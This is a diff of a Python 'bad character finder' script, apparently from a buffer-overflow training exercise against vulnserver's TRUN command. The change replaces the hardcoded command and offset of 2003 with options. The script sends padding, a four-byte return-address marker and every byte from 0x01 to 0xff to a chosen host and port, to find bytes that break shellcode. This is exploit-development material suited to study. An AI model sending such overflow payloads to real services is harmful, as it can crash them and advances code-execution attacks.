@@ -1,24 +1,28 @@
 #!/usr/bin/python
 import optparse, sys, socket
 
-parser = optparse.OptionParser('Example: python bad_char.py -t <target host> -p <target port>')
+parser = optparse.OptionParser('Example: python bad_char.py -t <target host> -p <target port> -c <command> -o <offset>')
 parser.add_option('-t', dest='target', type='string', help='Enter a target host')
 parser.add_option('-p', dest='port', type='int', help='Enter a target port')
+parser.add_option('-c', dest='command', type='string', help='Enter a vulnerable command')
+parser.add_option('-o', dest='offset', type='int', help='Enter a target offset')
 (options, args) = parser.parse_args()
 target = options.target
 port = options.port
+command = options.command
+offset = options.offset
 
 if (target == None) | (port == None):
 	print(parser.usage)
 	exit(0)
 
 print('\n---------------------------------BAD CHAR FINDER--------------------------------')
-print('                               Author: @rootshooter')
-print('                                  Version: 1.0')
+print('                                Author: @rootshooter')
+print('                                   Version: 1.0')
 print('--------------------------------------------------------------------------------')
 
-command = "TRUN /.:/"
-bad_chars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
+bad_chars = (
+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
 "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
 "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
 "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
@@ -33,8 +37,10 @@ bad_chars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
 "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
 "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
 "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
-"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
-payload = "A" * 2003 + bad_chars
+"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+)
+
+payload = "A" * offset + "B" * 4 + bad_chars
 
 try:
 	print('\n[+] Sending Payload')
@@ -46,5 +52,5 @@ try:
 	print('[+] Check debugger for bad characters\n')
 	
 except:
-	print('[-] ERROR: Connection Refused!\n')
+	print('[-] ERROR: Connection Refused!')
 	sys.exit()
